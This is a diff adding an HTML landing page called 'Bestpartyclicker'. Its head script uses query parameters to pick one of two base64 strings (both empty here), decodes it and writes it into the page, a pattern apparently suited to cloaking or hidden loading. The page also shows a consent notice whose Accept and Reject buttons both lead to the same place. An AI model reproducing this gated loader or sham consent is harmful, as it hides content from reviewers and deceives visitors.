@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta http-equiv="X-UA-Compatible" content="ie=edge"/><meta name="google" content="notranslate">
+    <title>Bestpartyclicker</title>
+    <link rel="stylesheet" href="css/main.css?v=5"/>
+    <script>
+      var params = window
+        .location
+        .search
+        .replace('?','')
+        .split('&')
+        .reduce(
+          function(p,e){
+              var a = e.split('=');
+              p[ decodeURIComponent(a[0])] = decodeURIComponent(a[1]);
+              return p;
+          },
+          {}
+        );
+      var string = '';
+      var string2 = '';
+      var decodedString = '';
+
+if (params['dops']){
+ if (params['dops'] == 'rtr'){
+   decodedString = atob(string2);
+ } else {
+   decodedString = atob(string);
+ }
+} else {
+   if (params['ag_custom_domain']){
+     var rtrHave = false;
+     var acd_arr = params['ag_custom_domain'].split("_");
+     for(var i = 0; i< acd_arr.length;i++){
+       if (acd_arr[i] == "rtr"){
+         rtrHave = true;
+       }
+     };
+     if (rtrHave){
+       decodedString = atob(string2);
+     }  else {
+       decodedString = atob(string);
+     }
+   } else {
+       decodedString = atob(string2);
+   }
+} 
+ 
+ document.write(''+ decodedString +'');
+  </script>
+    <script type="text/javascript" src="libs/jquery.min.js"></script>
+  </head>
+  <body>
+    <div class="app">
+      <!-- <a href="https://www.youtube.com/watch?v=FvpiRq55G8E" class="girls"><img src="image/girls2.png?v=12" alt="girls"/></a> -->
+      <div class="notice notice-fix notice-destroy">
+        <div class="notice-wrapper">
+          <!-- <div class="notice-bg"><img src="image/notice.png" alt="notice"/></div> -->
+          <div class="notice-text">
+            
+            <p class="text-first"><span>
+                We use scripts and similar technologies to understand how you use our services,
+                 improve your experience and serve you personalized content and advertising. 
+                 By clicking accept, you accept all scripts. To manage your scripts and learn
+                  more about our use of scripts click “reject/manage scripts”.
+                </span>
+            </p>
+            <div class="notice-btns"><a href="/" class="btns btn-true">Accept</a><a href="/" class="btns btn-false">Reject/Manage</a></div>
+            <p class="text-second">
+              Review and Manage Your Script SettingsThis page provides an 
+              overview of our use of scripts and similar technologies and how to manage them. 
+              For more information please visit our   <a href="/cookies.html">Cookie Policy</a> and our <a href="/privacy.html">Privacy Policy</a>.
+              
+              
+              
+            </p>
+          </div>
+        </div>
+      </div><a href="https://www.youtube.com/watch?v=V7yMA0CRdxc" class="play-btn playbtn2">Play</a>
+    </div>
+    <script type="text/javascript" src="scripts/main.js?v=2"></script>
+  </body>
+</html>
